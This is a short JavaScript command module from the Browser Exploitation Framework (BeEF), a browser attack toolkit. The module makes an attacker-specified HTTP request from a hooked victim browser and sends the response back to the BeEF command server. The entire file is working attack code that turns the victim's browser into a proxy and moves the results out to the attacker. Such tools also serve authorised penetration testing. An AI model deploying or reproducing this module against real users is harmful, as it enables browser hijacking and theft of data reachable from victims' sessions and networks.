//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var scheme = "<%= @scheme %>";
	var method = "<%= @method %>";
	var domain = "<%= @domain %>";
	var port = "<%= @port %>";
	var path = "<%= @path %>";
	var anchor = "<%= @anchor %>";
	var data = "<%= @data %>";
	var timeout = "<%= @timeout %>";
	var dataType = "<%= @dataType %>";

	beef.net.request(scheme, method, domain, port, path, anchor, data, timeout, dataType, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, JSON.stringify(response)); } );

});

